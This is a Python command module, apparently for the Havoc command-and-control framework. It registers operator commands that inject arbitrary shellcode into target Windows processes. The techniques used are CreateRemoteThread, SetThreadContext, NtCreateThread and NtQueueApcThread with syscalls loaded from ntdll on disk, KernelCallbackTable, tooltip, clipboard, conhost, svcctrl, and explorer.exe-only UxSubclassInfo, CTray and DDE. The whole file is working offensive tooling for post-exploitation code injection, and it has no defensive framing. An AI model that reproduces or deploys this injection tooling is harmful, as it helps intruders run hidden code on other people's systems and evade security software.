import traceback

from pyhavoc.core  import *
from pyhavoc.ui    import *
from pyhavoc.agent import *
from os.path       import exists, dirname, basename

CURRENT_DIR  = dirname( __file__ )
CACHE_OBJECT = False

##
## this are some util functions and the InjectionTaskBase
## base object which every injection command will inherit
##

def file_read( path: str ) -> bytes:
    handle    = open( path, 'rb' )
    obj_bytes = handle.read()
    handle.close()
    return obj_bytes


class InjectionTaskBase( HcKaineCommand ):

    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )

        self.capture_output = False

        name = self.command()

        self.bof_path = f"{dirname(__file__)}/{name}/{name}.{self.agent().agent_meta()['arch']}.o"
        self.key_id   = f'obj-inj-handle.{name}'

    async def execute( self, args ):
        return await self.execute_object()

    async def execute_object( self, *args, argv: bytes = None, description = '' ):
        if exists( self.bof_path ) is False:
            self.log_error( f"object file not found: {self.bof_path}" )
            return

        #
        # execute the already loaded object file if we
        # have it loaded + CACHE_OBJECT is still enabled
        #
        if self.key_id in self.agent().key_store and CACHE_OBJECT:
            task = self.agent().object_invoke(
                self.agent().key_store[ self.key_id ],
                'go',
                *args,
                object_argv  = argv,
                flag_capture = self.capture_output
            )
        else:
            task = self.agent().object_execute(
                file_read( self.bof_path ),
                'go',
                *args,
                object_argv  = argv,
                flag_cache   = CACHE_OBJECT,
                flag_capture = self.capture_output
            )

        uuid    = format( task.task_uuid(), 'x' )
        message = description

        #
        # this displays the informational message of the task being created
        # by either using the given execute_object description or use the
        # registered command description
        #
        if len( message ) == 0:
            message = self.description()
            if CACHE_OBJECT:
                message += ' (with caching enabled)'

            task.set_description( message )

        self.log_info( f'({uuid}) {message}' )

        #
        # now invoke and issue the task to the agent and wait for it to finish
        #
        try:
            result = await task.result()

            if CACHE_OBJECT and self.key_id not in self.agent().key_store:
                #
                # looks like we are not in the store meaning that the previously send
                # out task should be caching the object into memory and return us the handle
                #
                handle, output = result
                message        = f'(handle: 0x{handle:x})'

                self.agent().key_store[ self.key_id ] = handle
            else:
                #
                # normally wait for the object file to finish!
                #
                message = ''
                handle, output = 0, ''

                if len( result ) == 1:
                    output = result
                elif len( result ) == 2:
                    handle, output = result

            if len( output ) > 0 and self.capture_output:
                self.process_output( output, task.task_uuid() )
            elif self.capture_output:
                self.log_warn( f'{self.command()} has sent no output back!', task_id = task.task_uuid() )
        except Exception as e:
            self.log_error( f"({uuid}) failed to execute {self.command()}: {e}", task_id = task.task_uuid() )
            print( traceback.format_exc() )
            if str( e ) == 'STATUS_NOT_FOUND':
                self.log_warn( f'removing key store entry of {self.command()}' )
                del self.agent().key_store[ self.key_id ]
            return

        self.log_success( f"({uuid}) successfully executed {self.command()} {message}", task_id = task.task_uuid() )

    def process_output( self, output: str, task_id: int ):
        self.log_success( f'received output from {self.command()} [{len(output)} bytes]:', task_id = task_id )
        self.log_raw( output.decode(), task_id = task_id )
        return


##
## injection commands that require PID + shellcode
##

@KnRegisterCommand( command     = 'createremotethread',
                    description = 'inject shellcode using CreateRemoteThread technique',
                    group       = 'Injection Commands' )
class ObjectCreateRemoteThreadTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into a process using the\n"
            "   CreateRemoteThread technique.\n\n"
            "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
            "              have the agent use the spawnto to create a temporary\n"
            "              process to inject into.\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'PID', type=int, help='target PID (0 = spawn temporary process)' )
        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if args.PID < 0 or args.PID > 65535:
            self.log_error( 'invalid PID: must be between 0-65535' )
            return

        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        return await self.execute_object(
            argv        = bof_pack( 'ib', args.PID, shellcode ),
            description = f'injecting into PID {args.PID} using CreateRemoteThread'
        )


@KnRegisterCommand( command     = 'setthreadcontext',
                    description = 'inject shellcode using SetThreadContext technique',
                    group       = 'Injection Commands' )
class ObjectSetThreadContextTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into a process using the\n"
            "   SetThreadContext technique.\n\n"
            "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
            "              have the agent use the spawnto to create a temporary\n"
            "              process to inject into.\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'PID', type=int, help='target PID (0 = spawn temporary process)' )
        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if args.PID < 0 or args.PID > 65535:
            self.log_error( 'invalid PID: must be between 0-65535' )
            return

        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        return await self.execute_object(
            argv        = bof_pack( 'ib', args.PID, shellcode ),
            description = f'injecting into PID {args.PID} using SetThreadContext'
        )


@KnRegisterCommand( command     = 'ntcreatethread',
                    description = 'inject shellcode using NtCreateThread with syscalls from ntdll',
                    group       = 'Injection Commands' )
class ObjectNtCreateThreadTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into a process using the\n"
            "   NtCreateThread technique in combination with loading our own version\n"
            "   of the syscall commands from ntdll on disk.\n\n"
            "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
            "              have the agent use the spawnto to create a temporary\n"
            "              process to inject into.\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'PID', type=int, help='target PID (0 = spawn temporary process)' )
        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if args.PID < 0 or args.PID > 65535:
            self.log_error( 'invalid PID: must be between 0-65535' )
            return

        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        return await self.execute_object(
            argv        = bof_pack( 'ib', args.PID, shellcode ),
            description = f'injecting into PID {args.PID} using NtCreateThread'
        )


@KnRegisterCommand( command     = 'ntqueueapcthread',
                    description = 'inject shellcode using NtQueueApcThread with syscalls from ntdll',
                    group       = 'Injection Commands' )
class ObjectNtQueueApcThreadTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into a process using the\n"
            "   NtQueueApcThread technique in combination with loading our own version\n"
            "   of the syscall commands from ntdll on disk.\n\n"
            "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
            "              have the agent use the spawnto to create a temporary\n"
            "              process to inject into.\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'PID', type=int, help='target PID (0 = spawn temporary process)' )
        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if args.PID < 0 or args.PID > 65535:
            self.log_error( 'invalid PID: must be between 0-65535' )
            return

        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        return await self.execute_object(
            argv        = bof_pack( 'ib', args.PID, shellcode ),
            description = f'injecting into PID {args.PID} using NtQueueApcThread'
        )


@KnRegisterCommand( command     = 'kernelcallbacktable',
                    description = 'inject shellcode using KernelCallbackTable technique (GUI processes only)',
                    group       = 'Injection Commands' )
class ObjectKernelCallbackTableTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into a process using the\n"
            "   KernelCallbackTable technique in combination with loading our own\n"
            "   version of the syscall commands from ntdll on disk. This can only\n"
            "   target processes which handle window messages (GUIs).\n\n"
            "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
            "              have the agent use the spawnto to create a temporary\n"
            "              process to inject into, but this will not work with the\n"
            "              default of rundll32.exe.\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'PID', type=int, help='target PID (must be a GUI process)' )
        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if args.PID < 0 or args.PID > 65535:
            self.log_error( 'invalid PID: must be between 0-65535' )
            return

        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        return await self.execute_object(
            argv        = bof_pack( 'ib', args.PID, shellcode ),
            description = f'injecting into PID {args.PID} using KernelCallbackTable'
        )


@KnRegisterCommand( command     = 'tooltip',
                    description = 'inject shellcode using tooltip technique (processes with tooltips only)',
                    group       = 'Injection Commands' )
class ObjectTooltipTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into a process using the tooltip\n"
            "   technique in combination with loading our own version of the syscall\n"
            "   commands from ntdll on disk. This can only target processes with\n"
            "   windows that have tooltips, e.g., explorer.exe.\n\n"
            "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
            "              have the agent use the spawnto to create a temporary\n"
            "              process to inject into, but this will not work with the\n"
            "              default of rundll32.exe.\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'PID', type=int, help='target PID (must have tooltip windows)' )
        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if args.PID < 0 or args.PID > 65535:
            self.log_error( 'invalid PID: must be between 0-65535' )
            return

        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        return await self.execute_object(
            argv        = bof_pack( 'ib', args.PID, shellcode ),
            description = f'injecting into PID {args.PID} using tooltip technique'
        )


@KnRegisterCommand( command     = 'clipboardinject',
                    description = 'inject shellcode using clipboard technique',
                    group       = 'Injection Commands' )
class ObjectClipboardInjectTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into a process using the clipboardinject\n"
            "   technique in combination with loading our own version of the syscall\n"
            "   commands from ntdll on disk. This can only target processes with\n"
            "   windows that have a clipboard window, e.g., explorer.exe,\n"
            "   vmtoolsd.exe, or the svchost.exe on Windows 10 responsible for the\n"
            "   clipboard service.\n\n"
            "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
            "              have the agent use the spawnto to create a temporary\n"
            "              process to inject into, but this will not work with the\n"
            "              default of rundll32.exe.\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'PID', type=int, help='target PID (must have clipboard window)' )
        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if args.PID < 0 or args.PID > 65535:
            self.log_error( 'invalid PID: must be between 0-65535' )
            return

        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        return await self.execute_object(
            argv        = bof_pack( 'ib', args.PID, shellcode ),
            description = f'injecting into PID {args.PID} using clipboard technique'
        )


@KnRegisterCommand( command     = 'conhost',
                    description = 'inject shellcode using conhost technique (conhost.exe only)',
                    group       = 'Injection Commands' )
class ObjectConhostTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into a process using the conhost\n"
            "   technique in combination with loading our own version of the syscall\n"
            "   commands from ntdll on disk. This can only target console applications\n"
            "   with a conhost.exe child process. The injection actually occurs in the\n"
            "   conhost.exe so target the PID. On Windows 7, the parent process of\n"
            "   conhost.exe is actually csrss.exe instead of the console application,\n"
            "   so this technique will not work.\n\n"
            "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
            "              have the agent use the spawnto to create a temporary\n"
            "              process to inject into, but this will not work with the\n"
            "              default of rundll32.exe.\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'PID', type=int, help='target conhost.exe PID' )
        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if args.PID < 0 or args.PID > 65535:
            self.log_error( 'invalid PID: must be between 0-65535' )
            return

        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        return await self.execute_object(
            argv        = bof_pack( 'ib', args.PID, shellcode ),
            description = f'injecting into conhost PID {args.PID}'
        )


@KnRegisterCommand( command     = 'svcctrl',
                    description = 'inject shellcode using svcctrl technique (service host processes)',
                    group       = 'Injection Commands' )
class ObjectSvcCtrlTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into a process using the svcctrl\n"
            "   technique. This technique attempts to overwrite a service's internal\n"
            "   dispatch table in the targeted process, so the targeted process must\n"
            "   be hosting services, e.g., svchost.exe or spoolsrv.exe.\n\n"
            "   PID        Required. The PID to inject into. This technique can only\n"
            "              target processes which are hosting services.\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'PID', type=int, help='target PID (must be hosting services)' )
        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if args.PID < 0 or args.PID > 65535:
            self.log_error( 'invalid PID: must be between 0-65535' )
            return

        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        self.log_info( 'requesting SeDebugPrivilege' )

        return await self.execute_object(
            argv        = bof_pack( 'ib', args.PID, shellcode ),
            description = f'injecting into service host PID {args.PID} using svcctrl'
        )


##
## injection commands that only require shellcode (explorer.exe targets)
##

@KnRegisterCommand( command     = 'uxsubclassinfo',
                    description = 'inject shellcode into explorer.exe using UxSubclassInfo technique',
                    group       = 'Injection Commands' )
class ObjectUxSubclassInfoTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into explorer.exe using the\n"
            "   UxSubclassInfo technique in combination with loading our own version\n"
            "   of the syscall commands from ntdll on disk. This can only target\n"
            "   explorer, so no need to specify the PID, but make sure your shellcode\n"
            "   won't kill the process or thread.\n\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        return await self.execute_object(
            argv        = bof_pack( 'b', shellcode ),
            description = 'injecting into explorer.exe using UxSubclassInfo'
        )


@KnRegisterCommand( command     = 'ctray',
                    description = 'inject shellcode into explorer.exe using CTray technique',
                    group       = 'Injection Commands' )
class ObjectCTrayTask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into explorer.exe using the CTray\n"
            "   injection technique in combination with loading our own version of the\n"
            "   syscall commands from ntdll on disk. This can only target explorer, so\n"
            "   no need to specify the PID, but make sure your shellcode won't kill\n"
            "   the process or thread.\n\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
        )

        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        return await self.execute_object(
            argv        = bof_pack( 'b', shellcode ),
            description = 'injecting into explorer.exe using CTray'
        )


@KnRegisterCommand( command     = 'dde',
                    description = 'inject shellcode into explorer.exe using DDE technique',
                    group       = 'Injection Commands' )
class ObjectDDETask( InjectionTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   This command injects shellcode into explorer.exe using the DDE\n"
            "   injection technique in combination with loading our own version of the\n"
            "   syscall commands from ntdll on disk. This can only target explorer, so\n"
            "   no need to specify the PID, but make sure your shellcode won't kill\n"
            "   the process or thread.\n\n"
            "   SHELLCODE  Required. The file name of the shellcode to inject.\n\n"
            "Warning: The injection technique causes the shellcode to be executed FOUR\n"
            "         times so plan accordingly.\n"
        )

        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )

    async def execute( self, args ):
        if not exists( args.SHELLCODE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
            return

        shellcode = file_read( args.SHELLCODE )

        self.log_warn( 'DDE technique executes shellcode FOUR times!' )

        return await self.execute_object(
            argv        = bof_pack( 'b', shellcode ),
            description = 'injecting into explorer.exe using DDE'
        )
